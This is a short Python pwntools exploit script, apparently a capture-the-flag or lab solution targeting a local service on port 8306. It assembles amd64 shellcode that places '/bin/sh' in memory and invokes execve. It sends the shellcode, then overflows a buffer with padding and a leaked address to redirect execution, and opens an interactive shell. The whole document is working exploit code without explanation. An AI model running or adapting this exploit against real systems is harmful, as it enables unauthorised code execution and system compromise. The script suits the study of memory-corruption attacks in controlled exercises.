from pwn import *

context.arch = 'amd64'

io = remote('localhost', '8306')
# io = process('./shellcode')

shellcode = '''
mov rdi, 0x404100
mov rax, 0x68732f6e69622f
mov QWORD PTR [rdi], rax

mov rax, 0x3b
mov rdi, 0x404100
mov rsi, 0
mov rdx, 0
syscall
'''

io.recvuntil(': ')
name_addr = int(io.recvline(keepends=False), 16)

io.recvline()
print(asm(shellcode))
io.sendline(asm(shellcode))

io.recvline()
io.sendline(b'a'*0x18 + p64(name_addr))

io.interactive()


